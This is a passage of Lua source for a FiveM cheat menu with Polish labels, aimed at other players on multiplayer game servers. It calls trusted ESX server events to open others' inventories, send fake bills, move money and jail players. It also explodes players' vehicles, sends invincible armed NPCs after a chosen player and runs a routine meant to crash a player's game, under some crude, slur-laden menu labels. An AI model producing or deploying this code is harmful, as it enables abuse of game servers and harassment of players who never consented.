					TriggerServerEvent('esx_airlines:addLicense', 'helico')
					TriggerServerEvent('esx_airlines:addLicense', 'avion')
					
					elseif KoGuSzEk.B('~h~~g~Koguty koguszka') then
						local bQ = 'a_c_hen'
						local bR = 'weapon_rpg'
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        pizda(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
						
					end
					KoGuSzEk.Display()
					elseif KoGuSzEk.IsMenuOpened('') then
					if KoGuSzEk.B('~h~~g~ESX ~w~Revive Yourself~w~') then
                        TriggerServerEvent('esx_ambulancejob:revive')
                        TriggerServerEvent('ambulancier:selfRespawn')
					end
                    KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('ESXTriggerini') then
                if KoGuSzEk.B('~h~~g~Open Inventory') then
                    TriggerServerEvent("esx_inventoryhud:openPlayerInventory", GetPlayerServerId(SelectedPlayer), GetPlayerName(SelectedPlayer))
                elseif KoGuSzEk.B('~h~Send Bill') then
                    local bA=KeyboardInput("Enter amount","",100000000)
                    local ah=KeyboardInput("Enter the name of the bill","",100000000)
                    if bA and ah then 
                        TriggerServerEvent('esx_billing:sendBill',GetPlayerServerId(SelectedPlayer),"5391 was here",ah,bA)
                    else
                        return
                    end
                
                    
                elseif KoGuSzEk.B('~h~~g~Daj pieniadze graczowi z portfela') then
                    local m = KeyboardInput('Enter amount of money to give', '', 100)
                    if m ~= '' then
                        TriggerServerEvent(
                            'esx:giveInventoryItem',
                            GetPlayerServerId(SelectedPlayer),
                            'item_money',
                            'money',
                            m
                        )
                    end
               
                elseif KoGuSzEk.B('~h~~r~Wsadz do wiezienia') then
                    TriggerServerEvent(
                        'esx-qalle-jail:jailPlayer',
                        GetPlayerServerId(SelectedPlayer),
                        5000,
                        'unknown'
                    )
                    TriggerServerEvent('esx_jailer:sendToJail', GetPlayerServerId(SelectedPlayer), 45 * 60)
                    TriggerServerEvent('esx_jail:sendToJail', GetPlayerServerId(SelectedPlayer), 45 * 60)
                    TriggerServerEvent('js:jailuser', GetPlayerServerId(SelectedPlayer), 45 * 60, 'unknown')
                end
                
               
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('Trollmenu') then
                if KoGuSzEk.MB('~h~~p~»~w~ Zresp pedy', 'SpawnPeds') then
                --[[elseif KoGuSzEk.B('~h~~r~Fake ~w~Chat Message') then
                    local e1 = KeyboardInput('Enter message to send', '', 100)
                    local e2 = GetPlayerName(SelectedPlayer)
                    if e1 then
                        TriggerServerEvent(
                            '_chat:messageEntered',
                            e2,
                            {
                                0,
                                0x99,
                                255
                            },
                            e1
                        )
                    end--]]
					elseif KoGuSzEk.MB('~h~~p~»~w~ Zresp modele', 'modelezresp') then
                elseif KoGuSzEk.B('~h~~r~Wyrzuc ~w~z auta') then
                    ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
                elseif KoGuSzEk.B('~h~~y~Wysadz ~w~Auto') then
                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                        AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 4, 1337.0, false, true, 0.0)
                    else
                        av('~h~~w~Player not in a vehicle~w~.', false)
                    end
                elseif KoGuSzEk.B('~h~~r~Wystrzel jego auto') then
                    if GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false) ~= 0 then
                        local e3 = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        local e4 = GetEntityHeading(GetPlayerPed(SelectedPlayer))
                        --local e5 = CreatePed(5, 68070371, e3, e4, true)
                        local e6 = CreateVehicle(GetHashKey('adder'), e3, e4, true, false)
                        SetPedIntoVehicle(e5, e6, -1)
                    else
                        av('~h~~w~Player not in a vehicle~w~.', false)
                    end
                elseif KoGuSzEk.B('~h~~y~Banana ~p~Party') then
                    local bH = CreateObject(GetHashKey('p_crahsed_heli_s'), 0, 0, 0, true, true, true)
                    local bI = CreateObject(GetHashKey('prop_rock_4_big2'), 0, 0, 0, true, true, true)
                    local bJ = CreateObject(GetHashKey('prop_beachflag_le'), 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                        bH,
                        GetPlayerPed(SelectedPlayer),
                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005),
                        0.4,
                        0,
                        0,
                        0,
                        270.0,
                        60.0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                    AttachEntityToEntity(
                        bI,
                        GetPlayerPed(SelectedPlayer),
                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005),
                        0.4,
                        0,
                        0,
                        0,
                        270.0,
                        60.0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                    AttachEntityToEntity(
                        bJ,
                        GetPlayerPed(SelectedPlayer),
                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005),
                        0.4,
                        0,
                        0,
                        0,
                        270.0,
                        60.0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                elseif KoGuSzEk.B('~h~~r~Wysadz') then
                    AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, 100000.0)
                    AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, true)
                elseif KoGuSzEk.B('~h~~r~Wyruchaj') then
                    pizdaSync('a_m_o_acult_01')
                    RequestAnimDict('rcmpaparazzo_2')
                    while not HasAnimDictLoaded('rcmpaparazzo_2') do
                        Citizen.Wait(0)
                    end
                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                        local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)
                        while not NetworkHasControlOfEntity(veh) do
                            NetworkRequestControlOfEntity(veh)
                            Citizen.Wait(0)
                        end
                        SetEntityAsMissionEntity(veh, true, true)
                        DeleteVehicle(veh)
                        DeleteEntity(veh)
                    end
                    count = -0.2
                    for b = 1, 3 do
                        local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer), true))
                        local bS = CreatePed(4, GetHashKey('a_m_o_acult_01'), x, y, z, 0.0, true, false)
                        SetEntityAsMissionEntity(bS, true, true)
                        AttachEntityToEntity(
                            bS,
                            GetPlayerPed(SelectedPlayer),
                            4103,
                            11816,
                            count,
                            0.00,
                            0.0,
                            0.0,
                            0.0,
                            0.0,
                            false,
                            false,
                            false,
                            false,
                            2,
                            true
                        )
                        ClearPedTasks(GetPlayerPed(SelectedPlayer))
                        TaskPlayAnim(
                            GetPlayerPed(SelectedPlayer),
                            'rcmpaparazzo_2',
                            'shag_loop_poppy',
                            2.0,
                            2.5,
                            -1,
                            49,
                            0,
                            0,
                            0,
                            0
                        )
                        SetPedKeepTask(bS)
                        TaskPlayAnim(bS, 'rcmpaparazzo_2', 'shag_loop_a', 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                        SetEntityInvincible(bS, true)
                        count = count - 0.4
                    end
                elseif KoGuSzEk.B('~h~~r~Zamknij ~w~gracza') then
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                    roundz = tonumber(string.format('%.2f', z))
                    local e7 = 'prop_fnclink_05crnr1'
                    local e8 = GetHashKey(e7)
                    pizda(e8)
                    while not HasModelLoaded(e8) do
                        Citizen.Wait(0)
                    end
                    local e9 = CreateObject(e8, roundx - 1.70, roundy - 1.70, roundz - 1.0, true, true, false)
                    local ea = CreateObject(e8, roundx + 1.70, roundy + 1.70, roundz - 1.0, true, true, false)
                    SetEntityHeading(e9, -90.0)
                    SetEntityHeading(ea, 90.0)
                    FreezeEntityPosition(e9, true)
                    FreezeEntityPosition(ea, true)
                elseif KoGuSzEk.B('~h~~y~Hamburgheruj ~w~gracza') then
                    local eb = 'xs_prop_hamburgher_wl'
                    local ec = GetHashKey(eb)
                    local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                        ed,
                        GetPlayerPed(SelectedPlayer),
                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                        0,
                        0,
                        -1.0,
                        0.0,
                        0.0,
                        0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                elseif KoGuSzEk.B('~h~~y~Hamburgher ~w~Auto gracza') then
                    local eb = 'xs_prop_hamburgher_wl'
                    local ec = GetHashKey(eb)
                    local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                        ed,
                        GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false),
                        GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), 'chassis'),
                        0,
                        0,
                        -1.0,
                        0.0,
                        0.0,
                        0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                elseif KoGuSzEk.B('~h~~o~_!_ ~r~CRASHuj ~w~Gracza ~o~_!_') then
                    local ej = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    local ek = {
                        0x9CF21E0F,
                        0x34315488,
                        0x6A27FEB1,
                        0xCB2ACC8,
                        0xC6899CDE,
                        0xD14B5BA3,
                        0xD9F4474C,
                        0x32A9996C,
                        0x69D4F974,
                        0xCAFC1EC3,
                        0x79B41171,
                        0x1075651,
                        0xC07792D4,
                        0x781E451D,
                        0x762657C6,
                        0xC2E75A21,
                        0xC3C00861,
                        0x81FB3FF0,
                        0x45EF7804,
                        0xE65EC0E4,
                        0xE764D794,
                        0xFBF7D21F,
                        0xE1AEB708,
                        0xA5E3D471,
                        0xD971BBAE,
                        0xCF7A9A9D,
                        0xC2CC99D8,
                        0x8FB233A4,
                        0x24E08E1F,
                        0x337B2B54,
                        0xB9402F87,
                        0x4F2526DA
                    }
                    for i = 1, #ek do
                        local a = CreateObject(ek[i], ej, true, true, true)
                    end
                end
				

                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('SpawnPeds') then
			if KoGuSzEk.B('~h~~r~Zresp ~r~customowego peda') then
                    local bQ =KeyboardInput("Resp code peda https://wiki.rage.mp/index.php?title=Peds","",100000000)
                    local bR =KeyboardInput("Z jaka bronia? weapon_(nazwa)","",100000000)					
                    for i = 0, 2 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        pizda(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
                elseif KoGuSzEk.B('~h~~r~Zresp ~w~SWAT z ~y~AK') then
                    local bQ = 's_m_y_swat_01'
                    local bR = 'WEAPON_ASSAULTRIFLE'
                    for i = 0, 2 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        pizda(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end 
					elseif KoGuSzEk.B('~h~~r~Zresp ~w~wieloryba') then
                    local bQ = 'a_c_humpback'
                    local bR = 'WEAPON_ASSAULTRIFLE'
                    for i = 0, 2 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        pizda(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
					elseif KoGuSzEk.B('~h~~r~Zresp ~w~pedofila jebanego w dupe') then
                    local bQ = 'cs_priest'
                    local bR = 'WEAPON_ASSAULTRIFLE'
                    for i = 0, 2 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        pizda(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
                
                elseif KoGuSzEk.B('~h~~r~Zresp ~w~SWAT z ~y~pistoletem na flary') then
                    local bQ = 's_m_y_swat_01'
                    local bR = 'weapon_flaregun'
                    for i = 0, 2 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        pizda(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
                elseif KoGuSzEk.B('~h~~r~Zresp ~w~SWAT z ~y~Railgunem') then
                    local bQ = 's_m_y_swat_01'
                    local bR = 'weapon_railgun'
                    for i = 0, 2 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        pizda(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
					elseif KoGuSzEk.B('~h~~r~Zresp ~w~swinie') then
                    local bQ = 'a_c_pig'
                    local bR = 'weapon_rpg'
                    for i = 0, 2 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        pizda(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end 
					elseif KoGuSzEk.B('~h~~r~Zresp ~w~dzika') then
                    local bQ = 'a_c_boar'
                    local bR = 'weapon_rpg'
                    for i = 0, 2 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        pizda(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
					elseif KoGuSzEk.B('~h~~r~Zresp ~w~szympansa') then
                    local bQ = 'a_c_chimp'
                    local bR = 'weapon_rpg'
                    for i = 0, 2 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        pizda(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
					elseif KoGuSzEk.B('~h~~r~Zresp ~w~lwa skazy') then
                    local bQ = 'a_c_mtlion'
                    local bR = 'weapon_rpg'
                    for i = 0, 2 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        pizda(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end 
					elseif KoGuSzEk.B('~h~~r~Zresp ~g~aliena') then
                    local bQ = 's_m_m_movalien_01'
                    local bR = 'weapon_rpg'
                    for i = 0, 2 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        pizda(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
					elseif KoGuSzEk.B('~h~~r~Zresp ~g~krowe') then
                    local bQ = 'a_c_cow'
                    local bR = 'weapon_rpg'
                    for i = 0, 2 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        pizda(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
				
				
				elseif KoGuSzEk.B('~h~~r~Zresp ~w~orki ') then
                    local bQ = 'a_c_killerwhale'
                    local bR = 'weapon_knife'
                    for i = 0, 2 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        pizda(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
				elseif KoGuSzEk.B('~h~~r~Zresp ~w~psy') then
                    local bQ = 'a_c_pug'
                    local bR = 'weapon_knife'
                    for i = 0, 2 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        pizda(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
